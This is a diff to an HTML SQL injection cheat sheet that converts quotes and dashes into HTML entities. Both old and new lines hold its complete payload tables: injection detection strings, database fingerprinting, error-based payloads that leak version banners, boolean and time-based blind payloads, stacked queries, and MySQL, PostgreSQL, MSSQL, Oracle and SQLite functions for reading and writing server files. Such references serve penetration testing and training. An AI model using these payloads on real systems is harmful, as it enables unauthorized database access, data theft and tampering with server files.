@@ -21,7 +21,7 @@ SQUIRTLE &#x1F4A6;&#x1F422;
 
 ## Avoiding OR &lt;true&gt; (OR 1=1)
 
-With the exception of CTFs, injections involving an OR &lt;true&gt; expression (e.g. ' OR 1=1 -- -) should be avoided unless absolutely necessary.
+With the exception of CTFs, injections involving an OR &lt;true&gt; expression (e.g. &#x27; OR 1=1 &#x2D;&#x2D; &#x2D;) should be avoided unless absolutely necessary.
 
 I wrote about the reasons why in <a href="https://tcm-sec.com/avoid-or-1-equals-1-in-sql-injections/">this article</a> and spoke about them at length in <a href="https://www.youtube.com/watch?v=8iSGWP7lk-M">this video</a>.
 
@@ -31,7 +31,7 @@ If you have a "valid value", there is practically no need for an OR &lt;true&gt;
 
 A simplistic but generally reliable method for finding basic SQL injections.
 
-First, "break" the statement by injecting a single or double quote into an otherwise valid value (e.g. username=admin').
+First, "break" the statement by injecting a single or double quote into an otherwise valid value (e.g. username=admin&#x27;).
 
 Then, replace the injected quote with each of the following "repairs" in turn, to see if one results in the original (uninjected) response:
 
@@ -43,19 +43,19 @@ Then, replace the injected quote with each of the following "repairs" in turn, t
 </thead>
 <tbody>
 <tr>
-<td>' '</td>
+<td>&#x27; &#x27;</td>
 </tr>
 <tr>
-<td>'||'</td>
+<td>&#x27;||&#x27;</td>
 </tr>
 <tr>
-<td>'+'</td>
+<td>&#x27;+&#x27;</td>
 </tr>
 <tr>
-<td>' AND '1'='1</td>
+<td>&#x27; AND &#x27;1&#x27;=&#x27;1</td>
 </tr>
 <tr>
-<td>' -- -</td>
+<td>&#x27; &#x2D;&#x2D; &#x2D;</td>
 </tr>
 </tbody>
 </table>
@@ -70,13 +70,13 @@ In some cases, none of our "repairs" work because we are injecting into an integ
 </thead>
 <tbody>
 <tr>
-<td>&nbsp;-- -</td>
+<td>&nbsp;&#x2D;&#x2D; &#x2D;</td>
 </tr>
 <tr>
 <td>&nbsp;AND 1=1</td>
 </tr>
 <tr>
-<td>&nbsp;AND 1=1 -- -</td>
+<td>&nbsp;AND 1=1 &#x2D;&#x2D; &#x2D;</td>
 </tr>
 </tbody>
 </table>
@@ -96,27 +96,27 @@ Once a potential injection is found, the database variant (e.g. MySQL, PostgreSQ
 <tbody>
 <tr>
 <td>1</td>
-<td>AND 'foo' 'bar' = 'foobar'</td>
+<td>AND &#x27;foo&#x27; &#x27;bar&#x27; = &#x27;foobar&#x27;</td>
 <td>MySQL</td>
 </tr>
 <tr>
 <td>2</td>
-<td>AND DATALENGTH('foo') = 3</td>
+<td>AND DATALENGTH(&#x27;foo&#x27;) = 3</td>
 <td>MSSQL</td>
 </tr>
 <tr>
 <td>3</td>
-<td>AND TO_HEX(1) = '1'</td>
+<td>AND TO_HEX(1) = &#x27;1&#x27;</td>
 <td>PostgreSQL</td>
 </tr>
 <tr>
 <td>4</td>
-<td>AND LENGTHB('foo') = '3'</td>
+<td>AND LENGTHB(&#x27;foo&#x27;) = &#x27;3&#x27;</td>
 <td>Oracle</td>
 </tr>
 <tr>
 <td>5</td>
-<td>AND GLOB('foo*', 'foobar') = 1</td>
+<td>AND GLOB(&#x27;foo*&#x27;, &#x27;foobar&#x27;) = 1</td>
 <td>SQLite</td>
 </tr>
 </tbody>
@@ -124,7 +124,7 @@ Once a potential injection is found, the database variant (e.g. MySQL, PostgreSQ
 
 ## Comments
 
-This comment syntax can be used to add comments to SQL statements, useful for commenting out anything after an injection, as well as bypassing certain filters. Note that -- comments require a space after the -- to be valid, and /\*comment\*/ are in-line comments.
+This comment syntax can be used to add comments to SQL statements, useful for commenting out anything after an injection, as well as bypassing certain filters. Note that &#x2D;&#x2D; comments require a space after the &#x2D;&#x2D; to be valid, and /\*comment\*/ are in-line comments.
 
 <table>
 <thead>
@@ -139,35 +139,35 @@ This comment syntax can be used to add comments to SQL statements, useful for co
 <td># comment</td>
 </tr>
 <tr>
-<td>-- comment</td>
+<td>&#x2D;&#x2D; comment</td>
 </tr>
 <tr>
 <td>/*comment*/</td>
 </tr>
 <tr>
 <td rowspan="2" class="span">PostgreSQL</td>
-<td>-- comment</td>
+<td>&#x2D;&#x2D; comment</td>
 </tr>
 <tr>
 <td>/*comment*/</td>
 </tr>
 <tr>
 <td rowspan="2" class="span">MSSQL</td>
-<td>-- comment</td>
+<td>&#x2D;&#x2D; comment</td>
 </tr>
 <tr>
 <td>/*comment*/</td>
 </tr>
 <tr>
 <td rowspan="2" class="span">Oracle</td>
-<td>-- comment</td>
+<td>&#x2D;&#x2D; comment</td>
 </tr>
 <tr>
 <td>/*comment*/</td>
 </tr>
 <tr>
 <td rowspan="2" class="span">SQLite</td>
-<td>-- comment</td>
+<td>&#x2D;&#x2D; comment</td>
 </tr>
 <tr>
 <td>/*comment*/</td>
@@ -189,38 +189,38 @@ These functions / operators can be used to concatenate two or more strings toget
 <tbody>
 <tr>
 <td rowspan="2" class="span">MySQL</td>
-<td>'foo' 'bar'</td>
+<td>&#x27;foo&#x27; &#x27;bar&#x27;</td>
 </tr>
 <tr>
-<td>CONCAT('foo', 'bar')</td>
+<td>CONCAT(&#x27;foo&#x27;, &#x27;bar&#x27;)</td>
 </tr>
 <tr>
 <td rowspan="2" class="span">PostgreSQL</td>
-<td>'foo'||'bar'</td>
+<td>&#x27;foo&#x27;||&#x27;bar&#x27;</td>
 </tr>
 <tr>
-<td>CONCAT('foo', 'bar')</td>
+<td>CONCAT(&#x27;foo&#x27;, &#x27;bar&#x27;)</td>
 </tr>
 <tr>
 <td rowspan="2" class="span">MSSQL</td>
-<td>'foo'+'bar'</td>
+<td>&#x27;foo&#x27;+&#x27;bar&#x27;</td>
 </tr>
 <tr>
-<td>CONCAT('foo', 'bar')</td>
+<td>CONCAT(&#x27;foo&#x27;, &#x27;bar&#x27;)</td>
 </tr>
 <tr>
 <td rowspan="2" class="span">Oracle</td>
-<td>'foo'||'bar'</td>
+<td>&#x27;foo&#x27;||&#x27;bar&#x27;</td>
 </tr>
 <tr>
-<td>CONCAT('foo', 'bar')</td>
+<td>CONCAT(&#x27;foo&#x27;, &#x27;bar&#x27;)</td>
 </tr>
 <tr>
 <td rowspan="2" class="span">SQLite</td>
-<td>'foo'||'bar'</td>
+<td>&#x27;foo&#x27;||&#x27;bar&#x27;</td>
 </tr>
 <tr>
-<td>CONCAT('foo', 'bar')</td>
+<td>CONCAT(&#x27;foo&#x27;, &#x27;bar&#x27;)</td>
 </tr>
 </tbody>
 </table>
@@ -239,32 +239,32 @@ These functions can be used to select a substring of a string. The START value s
 <tbody>
 <tr>
 <td rowspan="2" class="span">MySQL</td>
-<td>SUBSTRING('foobar', START, LENGTH)</td>
+<td>SUBSTRING(&#x27;foobar&#x27;, START, LENGTH)</td>
 </tr>
 <tr>
-<td>SUBSTR('foobar', START, LENGTH)</td>
+<td>SUBSTR(&#x27;foobar&#x27;, START, LENGTH)</td>
 </tr>
 <tr>
 <td rowspan="2" class="span">PostgreSQL</td>
-<td>SUBSTRING('foobar', START, LENGTH)</td>
+<td>SUBSTRING(&#x27;foobar&#x27;, START, LENGTH)</td>
 </tr>
 <tr>
-<td>SUBSTR('foobar', START, LENGTH)</td>
+<td>SUBSTR(&#x27;foobar&#x27;, START, LENGTH)</td>
 </tr>
 <tr>
 <td class="span">MSSQL</td>
-<td>SUBSTRING('foobar', START, LENGTH)</td>
+<td>SUBSTRING(&#x27;foobar&#x27;, START, LENGTH)</td>
 </tr>
 <tr>
 <td class="span">Oracle</td>
-<td>SUBSTR('foobar', START, LENGTH)</td>
+<td>SUBSTR(&#x27;foobar&#x27;, START, LENGTH)</td>
 </tr>
 <tr>
 <td rowspan="2" class="span">SQLite</td>
-<td>SUBSTRING('foobar', START, LENGTH)</td>
+<td>SUBSTRING(&#x27;foobar&#x27;, START, LENGTH)</td>
 </tr>
 <tr>
-<td>SUBSTR('foobar', START, LENGTH)</td>
+<td>SUBSTR(&#x27;foobar&#x27;, START, LENGTH)</td>
 </tr>
 </tbody>
 </table>
@@ -284,39 +284,39 @@ These functions count the length of strings, either in terms of bytes or charact
 <tbody>
 <tr>
 <td rowspan="2" class="span">MySQL</td>
-<td>LENGTH('foo')</td>
+<td>LENGTH(&#x27;foo&#x27;)</td>
 <td>Counts number of bytes</td>
 </tr>
 <tr>
-<td>CHAR_LENGTH('foo')</td>
+<td>CHAR_LENGTH(&#x27;foo&#x27;)</td>
 <td>Counts number of chars (inc. multi-byte chars)</td>
 </tr>
 <tr>
 <td class="span">PostgreSQL</td>
-<td>LENGTH('foo')</td>
+<td>LENGTH(&#x27;foo&#x27;)</td>
 <td>Counts number of chars (inc. multi-byte chars)</td>
 </tr>
 <tr>
 <td rowspan="2" class="span">MSSQL</td>
-<td>DATALENGTH('foo')</td>
+<td>DATALENGTH(&#x27;foo&#x27;)</td>
 <td>Counts number of bytes</td>
 </tr>
 <tr>
-<td>LEN('foo')</td>
+<td>LEN(&#x27;foo&#x27;)</td>
 <td>Counts number of chars (inc. multi-byte chars)</td>
 </tr>
 <tr>
 <td rowspan="2" class="span">Oracle</td>
-<td>LENGTHB('foo')</td>
+<td>LENGTHB(&#x27;foo&#x27;)</td>
 <td>Counts number of bytes</td>
 </tr>
 <tr>
-<td>LENGTH('foo')</td>
+<td>LENGTH(&#x27;foo&#x27;)</td>
 <td>Counts number of chars (inc. multi-byte chars)</td>
 </tr>
 <tr>
 <td class="span">SQLite</td>
-<td>LENGTH('foo')</td>
+<td>LENGTH(&#x27;foo&#x27;)</td>
 <td>Counts number of chars (inc. multi-byte chars)</td>
 </tr>
 </tbody>
@@ -336,30 +336,30 @@ These functions concatenate values from multiple rows of results into a single s
 <tbody>
 <tr>
 <td class="span">MySQL</td>
-<td>GROUP_CONCAT(expression, 'DELIMITER')</td>
+<td>GROUP_CONCAT(expression, &#x27;DELIMITER&#x27;)</td>
 </tr>
 <tr>
 <td class="span">PostgreSQL</td>
-<td>STRING_AGG(expression, 'DELIMITER')</td>
+<td>STRING_AGG(expression, &#x27;DELIMITER&#x27;)</td>
 </tr>
 <tr>
 <td class="span">MSSQL</td>
-<td>STRING_AGG(expression, 'DELIMITER')</td>
+<td>STRING_AGG(expression, &#x27;DELIMITER&#x27;)</td>
 </tr>
 <tr>
 <td class="span">Oracle</td>
-<td>LISTAGG(expression, 'DELIMITER')</td>
+<td>LISTAGG(expression, &#x27;DELIMITER&#x27;)</td>
 </tr>
 <tr>
 <td class="span">SQLite</td>
-<td>GROUP_CONCAT(expression, 'DELIMITER')</td>
+<td>GROUP_CONCAT(expression, &#x27;DELIMITER&#x27;)</td>
 </tr>
 </tbody>
 </table>
 
 ## Convert Characters to Integers for Comparisons
 
-Useful for blind SQL injections to determine the range a character falls in. Note that MySQL and Oracle's functions output a hexadecimal number, while the others output a decimal.
+Useful for blind SQL injections to determine the range a character falls in. Note that MySQL and Oracle&#x27;s functions output a hexadecimal number, while the others output a decimal.
 
 <table>
 <thead>
@@ -372,27 +372,27 @@ Useful for blind SQL injections to determine the range a character falls in. Not
 <tbody>
 <tr>
 <td class="span">MySQL</td>
-<td>HEX('a')</td>
+<td>HEX(&#x27;a&#x27;)</td>
 <td>61</td>
 </tr>
 <tr>
 <td class="span">PostgreSQL</td>
-<td>ASCII('a')</td>
+<td>ASCII(&#x27;a&#x27;)</td>
 <td>97</td>
 </tr>
 <tr>
 <td class="span">MSSQL</td>
-<td>UNICODE('a')</td>
+<td>UNICODE(&#x27;a&#x27;)</td>
 <td>97</td>
 </tr>
 <tr>
 <td class="span">Oracle</td>
-<td>RAWTOHEX('a')</td>
+<td>RAWTOHEX(&#x27;a&#x27;)</td>
 <td>61</td>
 </tr>
 <tr>
 <td class="span">SQLite</td>
-<td>UNICODE('a')</td>
+<td>UNICODE(&#x27;a&#x27;)</td>
 <td>97</td>
 </tr>
 </tbody>
@@ -533,7 +533,7 @@ Queries which return the currently selected database / schema.
 <td>SELECT * FROM global_name</td>
 </tr>
 <tr>
-<td>SELECT sys_context('USERENV', 'CURRENT_SCHEMA') FROM dual;</td>
+<td>SELECT sys_context(&#x27;USERENV&#x27;, &#x27;CURRENT_SCHEMA&#x27;) FROM dual;</td>
 </tr>
 <tr>
 <td class="span">SQLite</td>
@@ -600,32 +600,32 @@ Queries which return a list of all tables in a given database / schema.
 <tbody>
 <tr>
 <td rowspan="2" class="span">MySQL</td>
-<td>SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='[DBNAME]'</td>
+<td>SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=&#x27;[DBNAME]&#x27;</td>
 </tr>
 <tr>
-<td>SELECT database_name,table_name FROM mysql.innodb_table_stats WHERE database_name='[DBNAME]'</td>
+<td>SELECT database_name,table_name FROM mysql.innodb_table_stats WHERE database_name=&#x27;[DBNAME]&#x27;</td>
 </tr>
 <tr>
 <td rowspan="2" class="span">PostgreSQL</td>
-<td>SELECT tablename FROM pg_tables WHERE schemaname = '[SCHEMA_NAME]'</td>
+<td>SELECT tablename FROM pg_tables WHERE schemaname = &#x27;[SCHEMA_NAME]&#x27;</td>
 </tr>
 <tr>
-<td>SELECT table_name FROM information_schema.tables WHERE table_schema='[SCHEMA_NAME]'</td>
+<td>SELECT table_name FROM information_schema.tables WHERE table_schema=&#x27;[SCHEMA_NAME]&#x27;</td>
 </tr>
 <tr>
 <td rowspan="2" class="span">MSSQL</td>
-<td>SELECT table_name FROM information_schema.tables WHERE table_catalog='[DBNAME]'</td>
+<td>SELECT table_name FROM information_schema.tables WHERE table_catalog=&#x27;[DBNAME]&#x27;</td>
 </tr>
 <tr>
-<td>SELECT name FROM [DBNAME]..sysobjects WHERE xtype='U'</td>
+<td>SELECT name FROM [DBNAME]..sysobjects WHERE xtype=&#x27;U&#x27;</td>
 </tr>
 <tr>
 <td class="span">Oracle</td>
-<td>SELECT OWNER,TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER='[DBNAME]'</td>
+<td>SELECT OWNER,TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER=&#x27;[DBNAME]&#x27;</td>
 </tr>
 <tr>
 <td class="span">SQLite</td>
-<td>SELECT tbl_name FROM sqlite_master WHERE type='table'</td>
+<td>SELECT tbl_name FROM sqlite_master WHERE type=&#x27;table&#x27;</td>
 </tr>
 </tbody>
 </table>
@@ -644,26 +644,26 @@ Queries which return a list of all columns in a given table & database / schema 
 <tbody>
 <tr>
 <td class="span">MySQL</td>
-<td>SELECT column_name,column_type FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='[TABLE_NAME]' AND table_schema='[DBNAME]'</td>
+<td>SELECT column_name,column_type FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=&#x27;[TABLE_NAME]&#x27; AND table_schema=&#x27;[DBNAME]&#x27;</td>
 </tr>
 <tr>
 <td class="span">PostgreSQL</td>
-<td>SELECT column_name,data_type FROM information_schema.columns WHERE table_schema='[DBNAME]' AND table_name='[TABLE_NAME]'</td>
+<td>SELECT column_name,data_type FROM information_schema.columns WHERE table_schema=&#x27;[DBNAME]&#x27; AND table_name=&#x27;[TABLE_NAME]&#x27;</td>
 </tr>
 <tr>
 <td class="span">MSSQL</td>
-<td>SELECT COL_NAME(OBJECT_ID('[DBNAME].[TABLE_NAME]'), [INDEX])</td>
+<td>SELECT COL_NAME(OBJECT_ID(&#x27;[DBNAME].[TABLE_NAME]&#x27;), [INDEX])</td>
 </tr>
 <tr>
 <td class="span">Oracle</td>
-<td>SELECT COLUMN_NAME,DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='[TABLE_NAME]' AND OWNER='[DBNAME]'</td>
+<td>SELECT COLUMN_NAME,DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME=&#x27;[TABLE_NAME]&#x27; AND OWNER=&#x27;[DBNAME]&#x27;</td>
 </tr>
 <tr>
 <td rowspan="2" class="span">SQLite</td>
-<td>SELECT MAX(sql) FROM sqlite_master WHERE tbl_name='[TABLE_NAME]'</td>
+<td>SELECT MAX(sql) FROM sqlite_master WHERE tbl_name=&#x27;[TABLE_NAME]&#x27;</td>
 </tr>
 <tr>
-<td>SELECT name FROM PRAGMA_TABLE_INFO('[TABLE_NAME]')</td>
+<td>SELECT name FROM PRAGMA_TABLE_INFO(&#x27;[TABLE_NAME]&#x27;)</td>
 </tr>
 </tbody>
 </table>
@@ -694,7 +694,7 @@ Payloads which cause an error in the SQL if the 1=1 conditional is true. Replace
 </tr>
 <tr>
 <td class="span">Oracle</td>
-<td>AND 1=(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '1' END FROM dual)</td>
+<td>AND 1=(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE &#x27;1&#x27; END FROM dual)</td>
 </tr>
 <tr>
 <td rowspan="2" class="span">SQLite</td>
@@ -720,22 +720,22 @@ These injection payloads should cause a database error and return the version in
 </thead>
 <tbody>
 <tr>
-<td>AND GTID_SUBSET(CONCAT('~',(SELECT version()),'~'),1337) -- -</td>
+<td>AND GTID_SUBSET(CONCAT(&#x27;~&#x27;,(SELECT version()),&#x27;~&#x27;),1337) &#x2D;&#x2D; &#x2D;</td>
 </tr>
 <tr>
-<td>AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('~',(SELECT version()),'~')) USING utf8))) -- -</td>
+<td>AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(&#x27;~&#x27;,(SELECT version()),&#x27;~&#x27;)) USING utf8))) &#x2D;&#x2D; &#x2D;</td>
 </tr>
 <tr>
-<td>AND EXTRACTVALUE(1337,CONCAT('.','~',(SELECT version()),'~')) -- -</td>
+<td>AND EXTRACTVALUE(1337,CONCAT(&#x27;.&#x27;,&#x27;~&#x27;,(SELECT version()),&#x27;~&#x27;)) &#x2D;&#x2D; &#x2D;</td>
 </tr>
 <tr>
-<td>AND UPDATEXML(1337,CONCAT('.','~',(SELECT version()),'~'),31337) -- -</td>
+<td>AND UPDATEXML(1337,CONCAT(&#x27;.&#x27;,&#x27;~&#x27;,(SELECT version()),&#x27;~&#x27;),31337) &#x2D;&#x2D; &#x2D;</td>
 </tr>
 <tr>
-<td>OR 1 GROUP BY CONCAT('~',(SELECT version()),'~',FLOOR(RAND(0)*2)) HAVING MIN(0) -- -</td>
+<td>OR 1 GROUP BY CONCAT(&#x27;~&#x27;,(SELECT version()),&#x27;~&#x27;,FLOOR(RAND(0)*2)) HAVING MIN(0) &#x2D;&#x2D; &#x2D;</td>
 </tr>
 <tr>
-<td>AND EXP(~(SELECT * FROM (SELECT CONCAT('~',(SELECT version()),'~','x'))x)) -- -</td>
+<td>AND EXP(~(SELECT * FROM (SELECT CONCAT(&#x27;~&#x27;,(SELECT version()),&#x27;~&#x27;,&#x27;x&#x27;))x)) &#x2D;&#x2D; &#x2D;</td>
 </tr>
 </tbody>
 </table>
@@ -750,16 +750,16 @@ These injection payloads should cause a database error and return the version in
 </thead>
 <tbody>
 <tr>
-<td>AND 1337=CAST('~'||(SELECT version())::text||'~' AS NUMERIC) -- -</td>
+<td>AND 1337=CAST(&#x27;~&#x27;||(SELECT version())::text||&#x27;~&#x27; AS NUMERIC) &#x2D;&#x2D; &#x2D;</td>
 </tr>
 <tr>
-<td>AND (CAST('~'||(SELECT version())::text||'~' AS NUMERIC)) -- -</td>
+<td>AND (CAST(&#x27;~&#x27;||(SELECT version())::text||&#x27;~&#x27; AS NUMERIC)) &#x2D;&#x2D; &#x2D;</td>
 </tr>
 <tr>
-<td>AND CAST((SELECT version()) AS INT)=1337 -- -</td>
+<td>AND CAST((SELECT version()) AS INT)=1337 &#x2D;&#x2D; &#x2D;</td>
 </tr>
 <tr>
-<td>AND (SELECT version())::int=1 -- -</td>
+<td>AND (SELECT version())::int=1 &#x2D;&#x2D; &#x2D;</td>
 </tr>
 </tbody>
 </table>
@@ -774,13 +774,13 @@ These injection payloads should cause a database error and return the version in
 </thead>
 <tbody>
 <tr>
-<td>AND 1337 IN (SELECT ('~'+(SELECT @@version)+'~')) -- -</td>
+<td>AND 1337 IN (SELECT (&#x27;~&#x27;+(SELECT @@version)+&#x27;~&#x27;)) &#x2D;&#x2D; &#x2D;</td>
 </tr>
 <tr>
-<td>AND 1337=CONVERT(INT,(SELECT '~'+(SELECT @@version)+'~')) -- -</td>
+<td>AND 1337=CONVERT(INT,(SELECT &#x27;~&#x27;+(SELECT @@version)+&#x27;~&#x27;)) &#x2D;&#x2D; &#x2D;</td>
 </tr>
 <tr>
-<td>AND 1337=CONCAT('~',(SELECT @@version),'~') -- -</td>
+<td>AND 1337=CONCAT(&#x27;~&#x27;,(SELECT @@version),&#x27;~&#x27;) &#x2D;&#x2D; &#x2D;</td>
 </tr>
 </tbody>
 </table>
@@ -795,16 +795,16 @@ These injection payloads should cause a database error and return the version in
 </thead>
 <tbody>
 <tr>
-<td>AND 1337=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'~'||(REPLACE(REPLACE(REPLACE(REPLACE((SELECT banner FROM v$version),' ','_'),'$','(DOLLAR)'),'@','(AT)'),'#','(HASH)'))||'~'||CHR(62))) FROM DUAL) -- -</td>
+<td>AND 1337=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||&#x27;~&#x27;||(REPLACE(REPLACE(REPLACE(REPLACE((SELECT banner FROM v$version),&#x27; &#x27;,&#x27;_&#x27;),&#x27;$&#x27;,&#x27;(DOLLAR)&#x27;),&#x27;@&#x27;,&#x27;(AT)&#x27;),&#x27;#&#x27;,&#x27;(HASH)&#x27;))||&#x27;~&#x27;||CHR(62))) FROM DUAL) &#x2D;&#x2D; &#x2D;</td>
 </tr>
 <tr>
-<td>AND 1337=UTL_INADDR.GET_HOST_ADDRESS('~'||(SELECT banner FROM v$version)||'~') -- -</td>
+<td>AND 1337=UTL_INADDR.GET_HOST_ADDRESS(&#x27;~&#x27;||(SELECT banner FROM v$version)||&#x27;~&#x27;) &#x2D;&#x2D; &#x2D;</td>
 </tr>
 <tr>
-<td>AND 1337=CTXSYS.DRITHSX.SN(1337,'~'||(SELECT banner FROM v$version)||'~') -- -</td>
+<td>AND 1337=CTXSYS.DRITHSX.SN(1337,&#x27;~&#x27;||(SELECT banner FROM v$version)||&#x27;~&#x27;) &#x2D;&#x2D; &#x2D;</td>
 </tr>
 <tr>
-<td>AND 1337=DBMS_UTILITY.SQLID_TO_SQLHASH('~'||(SELECT banner FROM v$version)||'~') -- -</td>
+<td>AND 1337=DBMS_UTILITY.SQLID_TO_SQLHASH(&#x27;~&#x27;||(SELECT banner FROM v$version)||&#x27;~&#x27;) &#x2D;&#x2D; &#x2D;</td>
 </tr>
 </tbody>
 </table>
@@ -831,7 +831,7 @@ These should only be used if you are certain only one row is going to be evaluat
 </tr>
 <tr>
 <td class="span">PostgreSQL</td>
-<td>AND 'RANDSTR'||PG_SLEEP(10)='RANDSTR'</td>
+<td>AND &#x27;RANDSTR&#x27;||PG_SLEEP(10)=&#x27;RANDSTR&#x27;</td>
 </tr>
 <tr>
 <td class="span">MSSQL</td>
@@ -839,11 +839,11 @@ These should only be used if you are certain only one row is going to be evaluat
 </tr>
 <tr>
 <td class="span">Oracle</td>
-<td>AND 1337=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('RANDSTR',10) ELSE 1337 END)</td>
+<td>AND 1337=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE(&#x27;RANDSTR&#x27;,10) ELSE 1337 END)</td>
 </tr>
 <tr>
 <td class="span">SQLite</td>
-<td>AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))</td>
+<td>AND 1337=LIKE(&#x27;ABCDEFG&#x27;,UPPER(HEX(RANDOMBLOB(1000000000/2))))</td>
 </tr>
 </tbody>
 </table>
@@ -874,11 +874,11 @@ These injection payloads are "safe" and should only ever sleep (for 10 seconds) 
 </tr>
 <tr>
 <td class="span">Oracle</td>
-<td>AND 1337=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('RANDSTR',10) ELSE 1337 END)</td>
+<td>AND 1337=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE(&#x27;RANDSTR&#x27;,10) ELSE 1337 END)</td>
 </tr>
 <tr>
 <td class="span">SQLite</td>
-<td>AND 1337=(CASE WHEN (1=1) THEN (SELECT 1337 FROM (SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))))) ELSE 1337 END)</td>
+<td>AND 1337=(CASE WHEN (1=1) THEN (SELECT 1337 FROM (SELECT LIKE(&#x27;ABCDEFG&#x27;,UPPER(HEX(RANDOMBLOB(1000000000/2)))))) ELSE 1337 END)</td>
 </tr>
 </tbody>
 </table>
@@ -897,23 +897,23 @@ Generally if stack based injection is supported, it is only detectable by causin
 <tbody>
 <tr>
 <td class="span">MySQL</td>
-<td>; SLEEP(10) -- -</td>
+<td>; SLEEP(10) &#x2D;&#x2D; &#x2D;</td>
 </tr>
 <tr>
 <td class="span">PostgreSQL</td>
-<td>; PG_SLEEP(10) -- -</td>
+<td>; PG_SLEEP(10) &#x2D;&#x2D; &#x2D;</td>
 </tr>
 <tr>
 <td class="span">MSSQL</td>
-<td>; WAITFOR DELAY '0:0:10' -- -</td>
+<td>; WAITFOR DELAY &#x27;0:0:10&#x27; &#x2D;&#x2D; &#x2D;</td>
 </tr>
 <tr>
 <td class="span">Oracle</td>
-<td>; DBMS_PIPE.RECEIVE_MESSAGE('RANDSTR',10) -- -</td>
+<td>; DBMS_PIPE.RECEIVE_MESSAGE(&#x27;RANDSTR&#x27;,10) &#x2D;&#x2D; &#x2D;</td>
 </tr>
 <tr>
 <td class="span">SQLite</td>
-<td>; RANDOMBLOB(1000000000/2) -- -</td>
+<td>; RANDOMBLOB(1000000000/2) &#x2D;&#x2D; &#x2D;</td>
 </tr>
 </tbody>
 </table>
@@ -938,22 +938,22 @@ Generally if stack based injection is supported, it is only detectable by causin
 </tr>
 <tr>
 <td class="span">MSSQL</td>
-<td>; IF(1=1) WAITFOR DELAY '0:0:10'</td>
+<td>; IF(1=1) WAITFOR DELAY &#x27;0:0:10&#x27;</td>
 </tr>
 <tr>
 <td class="span">Oracle</td>
-<td>; SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('RANDSTR',10) ELSE 1337 END FROM DUAL</td>
+<td>; SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE(&#x27;RANDSTR&#x27;,10) ELSE 1337 END FROM DUAL</td>
 </tr>
 <tr>
 <td class="span">SQLite</td>
-<td>; SELECT (CASE WHEN (1=1) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))) ELSE 1337 END)</td>
+<td>; SELECT (CASE WHEN (1=1) THEN (LIKE(&#x27;ABCDEFG&#x27;,UPPER(HEX(RANDOMBLOB(1000000000/2))))) ELSE 1337 END)</td>
 </tr>
 </tbody>
 </table>
 
 ## Reading Local Files
 
-These functions read the contents of local files. The Oracle method can only occur if stacked injections are possible. SQLite's readfile is not a core function.
+These functions read the contents of local files. The Oracle method can only occur if stacked injections are possible. SQLite&#x27;s readfile is not a core function.
 
 <table>
 <thead>
@@ -965,23 +965,23 @@ These functions read the contents of local files. The Oracle method can only occ
 <tbody>
 <tr>
 <td class="span">MySQL</td>
-<td>LOAD_FILE('/path/to/file')</td>
+<td>LOAD_FILE(&#x27;/path/to/file&#x27;)</td>
 </tr>
 <tr>
 <td class="span">PostgreSQL</td>
-<td>PG_READ_FILE('/path/to/file')</td>
+<td>PG_READ_FILE(&#x27;/path/to/file&#x27;)</td>
 </tr>
 <tr>
 <td class="span">MSSQL</td>
-<td>OPENROWSET(BULK 'C:\path\to\file', SINGLE_CLOB)</td>
+<td>OPENROWSET(BULK &#x27;C:\path\to\file&#x27;, SINGLE_CLOB)</td>
 </tr>
 <tr>
 <td class="span">Oracle</td>
-<td>utl_file.get_line(utl_file.fopen('/path/to/','file','R'), &lt;buffer&gt;)</td>
+<td>utl_file.get_line(utl_file.fopen(&#x27;/path/to/&#x27;,&#x27;file&#x27;,&#x27;R&#x27;), &lt;buffer&gt;)</td>
 </tr>
 <tr>
 <td class="span">SQLite</td>
-<td>readfile('/path/to/file')</td>
+<td>readfile(&#x27;/path/to/file&#x27;)</td>
 </tr>
 </tbody>
 </table>
@@ -1000,23 +1000,23 @@ These statements write content to a local file. The PostgreSQL, MSSQL, and Oracl
 <tbody>
 <tr>
 <td class="span">MySQL</td>
-<td>SELECT 'contents' INTO OUTFILE '/path/to/file'</td>
+<td>SELECT &#x27;contents&#x27; INTO OUTFILE &#x27;/path/to/file&#x27;</td>
 </tr>
 <tr>
 <td class="span">PostgreSQL</td>
-<td>COPY (SELECT 'contents') TO '/path/to/file'</td>
+<td>COPY (SELECT &#x27;contents&#x27;) TO &#x27;/path/to/file&#x27;</td>
 </tr>
 <tr>
 <td class="span">MSSQL</td>
-<td>execute spWriteStringToFile 'contents', 'C:\path\to\', 'file'</td>
+<td>execute spWriteStringToFile &#x27;contents&#x27;, &#x27;C:\path\to\&#x27;, &#x27;file&#x27;</td>
 </tr>
 <tr>
 <td class="span">Oracle</td>
-<td>utl_file.put_line(utl_file.fopen('/path/to/','file','R'), &lt;buffer&gt;)</td>
+<td>utl_file.put_line(utl_file.fopen(&#x27;/path/to/&#x27;,&#x27;file&#x27;,&#x27;R&#x27;), &lt;buffer&gt;)</td>
 </tr>
 <tr>
 <td class="span">SQLite</td>
-<td>SELECT writefile('/path/to/file', column_name) FROM table_name</td>
+<td>SELECT writefile(&#x27;/path/to/file&#x27;, column_name) FROM table_name</td>
 </tr>
 </tbody>
 </table>
